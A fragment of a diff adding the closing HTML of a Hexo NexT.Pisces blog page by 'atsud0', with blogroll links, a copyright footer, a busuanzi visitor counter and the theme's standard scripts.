+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
